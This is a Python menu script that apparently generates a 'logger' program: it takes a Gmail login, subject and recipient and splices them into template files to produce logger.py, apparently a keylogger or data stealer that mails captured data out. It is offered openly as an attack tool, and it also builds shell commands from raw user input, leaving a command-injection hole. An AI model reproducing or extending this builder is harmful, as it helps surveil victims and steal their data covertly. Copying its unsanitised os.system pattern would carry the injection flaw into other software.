# -*- coding: utf-8 -*-
# coding=utf-8
import socket,struct,os,sys,time,yagmail

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.1 / 100)

logo = """\x1b[32m

▄▄▌         ▄▄ •  ▄▄ • ▄▄▄ .▄▄▄  
██•  ▪     ▐█ ▀ ▪▐█ ▀ ▪▀▄.▀·▀▄ █·
██▪   ▄█▀▄ ▄█ ▀█▄▄█ ▀█▄▐▀▀▪▄▐▀▀▄ 
▐█▌▐▌▐█▌.▐▌▐█▄▪▐█▐█▄▪▐█▐█▄▄▌▐█•█▌
.▀▀▀  ▀█▄▀▪·▀▀▀▀ ·▀▀▀▀  ▀▀▀ .▀  ▀ \x1b[33m* PRO *\x1b[00m
"""

def header():
	os.system('clear')
	slowprint(logo)
	print('Logger-Creator \x1b[32mTOOLS \x1b[36mBy King Mr_Z17')
	print('\x1b[32m1. \x1b[00mCreate Logger')
	print('\x1b[32m2. \x1b[00mEdit logger')
	print('\x1b[32m3. \x1b[00mRemove logger')
	print('\x1b[32m4. \x1b[00mRead source code')
	print('\x1b[31m0. \x1b[31mExit')
	print('\x1b[00m')
	main()
	
def main():
	dog=input('\x1b[00mLogger®Creator\x1b[33m >> \x1b[32m')
	if dog == '':
		print('\x1b[00mCommand not found\x1b[91m!')
		main()
	elif dog == '1':
		print('')
		print('\x1b[00mPlease Login With Account Google')
		u=input('\x1b[00mInput your username: \x1b[33m')
		p=input('\x1b[00mInput your password: \x1b[33m')
		s=input('\x1b[00mInput your subject : \x1b[33m')
		t=input('\x1b[00mSend mail to       : \x1b[33m')
		b1=("""'"""+u+"""'"""+""","""+"""'"""+p+"""'"""+""")""")
		b2=("subject="+"""'"""+s+"""'""")
		print('\x1b[33m')
		b3=("""'"""+t+"""'"""+""","""+"subject"+""","""+"body"+""")""")
		b4=("")
		b5=("main"+"""("""+""")""")
		print('Creating logger code, please wait ...')
		os.system('sleep 3')
		os.system('cat log1 > logger.py;echo "'+b1+'" >> logger.py;echo "'+b2+'" >> logger.py;cat log2 >> logger.py;echo "'+b3+'" >> logger.py;print "'+b4+'" >> logger.py;print "'+b5+'" >> logger.py;cat logger.py > /sdcard/logger.py')
		slowprint('\x1b[00mSuccess, file auto saved as \x1b[33m/sdcard/logger.py')
		os.system('xdg-open https://www.youtube.com/channel/UCnIjuMDviDkcZ_EXC_iNh8g?sub_confirmation=1')
	elif dog == '2':
		os.system('nano logger.py')
		main()
	elif dog == '3':
		os.system('rm logger.py')
		print('\x1b[00mLogger has been removed \x1b[91m!')
		os.system('sleep 3')
		header()
	elif dog == '4':
		os.system('cat logger.py')
		main()
	elif dog == '0':
		os.system('xdg-open https://www.instagram.com/kingmr_z17/;exit')
	else:
		print('\x1b[00mCommand not found\x1b[91m!')
		main()

header()